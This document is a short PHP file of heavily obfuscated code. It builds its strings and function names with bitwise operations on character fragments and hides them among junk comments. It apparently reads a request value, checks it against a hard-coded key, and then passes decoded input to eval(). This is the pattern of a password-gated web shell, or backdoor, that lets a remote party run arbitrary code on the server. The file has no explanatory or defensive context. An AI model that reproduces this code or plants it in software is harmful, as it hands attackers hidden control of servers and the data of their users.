<?php
$KVadT7='W2vzV'^SJJs;$sJzxqdM="\$0b"|'84l';$YTf=WuTt.'>g'&"k/]*,f";$tAwgHYJvhOg=#Ka2yh'.
        'HP@@_A'|'HP@PS@';$D8IclgyAg8=MXPTUHNGE."!".tOQKGTU7HCA."^W"|'D%'.tTK0QDW.#kAv'.
        '@~'.WVFXF4tAEDQF;$klu="}_~tTO|~".DTrBhi7icW_Vp."^vlT"^'H;OA0-IM%'./*l548qvz6N'.
        'Wtk%*/mCuQYRPRd.';5D;FY5';$D5qXpVh40q='B!$E&T'|'f`4!dP';$HI8Ah0y464=HTTPBA|/*'.
        'o]98w*/HPDP.'@@';$WseZ4e=(APZ|"Q@[")^$sJzxqdM;$VA0OKmCh=$D5qXpVh40q|$YTf;'VWA'.
        '@rr )!.>v';$nrgOWvT6=$tAwgHYJvhOg|$HI8Ah0y464;$OprhfK7fBy=$D8IclgyAg8&('('./*'.
        'vL*/RPHKDO0vHGTKM.'^@ER@S%O!'|hDFRT.'^QA"]MPL*'.IECVMPuKr);if($WseZ4e(/*mIIQB'.
        'ROq$|H*/$VA0OKmCh($nrgOWvT6))==$klu.('5s1?s5'&';?;yov').(_^m))eval(/*tmjQLWWm'.
        'k{96z^v_ij*/$VA0OKmCh($OprhfK7fBy));#AXG1YSMrS-.ftfLc3tVTHyJAW+Bb%vX![Dxa{T]'.
        'BE[I!a?:5neg^=bC6ag$**ujHn@XTI<Kj{S>SHfW13uGXo]X,6-7Jx1wCggdXN-@_~';